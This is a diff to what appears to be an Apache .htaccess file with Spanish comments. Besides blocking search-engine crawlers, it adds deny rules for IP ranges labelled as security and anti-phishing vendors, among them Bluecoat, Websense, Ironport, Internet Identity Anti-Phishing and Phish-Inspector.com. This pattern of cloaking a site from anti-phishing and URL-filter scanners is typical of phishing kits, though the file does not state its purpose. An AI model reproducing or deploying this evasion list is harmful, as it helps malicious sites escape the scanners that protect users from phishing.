@@ -282,7 +282,6 @@ SetEnvIfNoCase User-Agent "Baiduspider" kill
 # Bloquear Motor de Busqueda Ruso
 SetEnvIfNoCase User-Agent "Yandex" kill
 
-
 <Limit GET POST HEAD>
 Order Allow,Deny
 Allow from all
@@ -302,6 +301,54 @@ deny from 38.118.42.32/29
 deny from 65.213.208.128/27
 deny from 65.222.176.96/27
 deny from 65.222.185.72/29
+# Bluecoat
+deny from 8.21.4.254
+deny from 65.46.48.192/30
+deny from 65.160.238.176/28
+deny from 85.92.222.0/24
+deny from 206.51.36.0/22
+deny from 216.52.23.0/24
+# Cyberpatrol
+deny from 38.103.17.160/27
+# Internet Identity - Anti-Phishing
+deny from 66.113.96.0/20
+deny from 70.35.113.192/27
+# Ironport
+deny from 204.15.80.0/22
+# Lightspeed Systems Security
+deny from 66.17.15.128/26
+deny from 69.84.207.32/27
+deny from 69.84.207.128/25
+# Layered Technologies
+deny from 72.36.128.0/17
+deny from 72.232.0.0/16
+deny from 72.233.0.0/17
+deny from 216.32.0.0/14
+# M86
+deny from 67.192.231.224/29
+deny from 208.90.236.0/22
+# Phish-Inspector.com
+deny from 209.147.127.208/28
+# Prescient Software, Inc. Phishmongers
+deny from 198.186.190.0/23
+deny from 198.186.192.0/23
+deny from 198.186.194.0/24
+# urlfilterdb
+deny from 207.210.99.32/29
+# websense-in.car1.sandiego1.level3.net
+deny from 4.53.120.22
+# Websense
+deny from 66.194.6.0/24
+deny from 67.117.201.128/28
+deny from 69.67.32.0/20
+deny from 131.191.87.0/24
+deny from 204.15.64.0/21
+deny from 208.80.192.0/21
+deny from 212.62.26.64/27
+deny from 213.168.226.0/24
+deny from 213.168.241.0/30
+deny from 213.168.242.0/30
+deny from 213.236.150.16/28
 #Kill swicht
 Deny from env=kill
 </Limit>
